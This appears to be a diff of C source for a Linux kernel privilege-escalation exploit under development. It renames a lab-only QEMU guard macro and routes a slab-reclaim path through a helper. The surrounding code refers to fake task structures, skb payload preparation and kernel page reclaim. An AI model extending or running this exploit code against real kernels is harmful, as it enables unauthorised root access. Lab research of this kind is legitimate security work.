@@ -82,7 +82,7 @@ static pid_t child_leak;
   (TCL_PREFIX_CHILDREN + 1 + TCL_SUFFIX_CHILDREN)
 static struct mm_ctx tcl_ctx;
 
-#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+#if GHOST_TCL_QEMU_LAB_ARMING
 struct tcl_qemu_pid_mm_diag {
   int32_t pid;
   uint32_t is_slab;
@@ -458,7 +458,7 @@ static int tcl_capture_witness(uintptr_t slab_kva) {
       MM_ORDER);
   int observer = -1;
   int pagemap = -1;
-#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+#if GHOST_TCL_QEMU_LAB_ARMING
   if (g_tcl_qemu_target_pfn != UINT64_MAX) {
     observer = open("/dev/glqemu-root", O_RDONLY | O_CLOEXEC);
     if (observer >= 0)
@@ -477,7 +477,7 @@ static int tcl_capture_witness(uintptr_t slab_kva) {
     total++;
     uint64_t pfn = UINT64_MAX;
     int have_pfn = 0;
-#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+#if GHOST_TCL_QEMU_LAB_ARMING
     if (observer >= 0) {
       struct tcl_qemu_va_pfn_diag q = {.user_va = (uintptr_t)page};
       if (ioctl(observer, TCL_QEMU_VA_TO_PFN_DIAG, &q) == 0) {
@@ -1343,7 +1343,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uintptr_t write_left = fake_left;
   uint64_t waiter_task = fake_task;
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
-#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+#if GHOST_TCL_QEMU_LAB_ARMING
   const char *lab_tg = getenv("TCL_QEMU_ROOT_TASK_GROUP");
   if (lab_tg && lab_tg[0])
     task_group = strtoull(lab_tg, NULL, 0);
@@ -1707,7 +1707,7 @@ static uintptr_t prepare_kernel_page_tcl(int payload_mode) {
   g_tcl_capture_block = -1;
   g_tcl_capture_status = TCL_CAPTURE_UNAVAILABLE;
   g_tcl_capture_method = "none";
-#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+#if GHOST_TCL_QEMU_LAB_ARMING
   g_tcl_qemu_target_pfn = UINT64_MAX;
 #endif
   pin_to_core(CORE);
@@ -1831,7 +1831,7 @@ fail:
 
 uintptr_t prepare_kernel_page(int payload_mode) {
   if (active_offsets &&
-      active_offsets->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT)
+      ghost_reclaim_is_tcl_exact(active_offsets->reclaim_route))
     return prepare_kernel_page_tcl(payload_mode);
   /* Independent safety barrier: even if analysis_only were accidentally
    * removed later, never run the Sabrina-specific SLUB/PCP choreography for
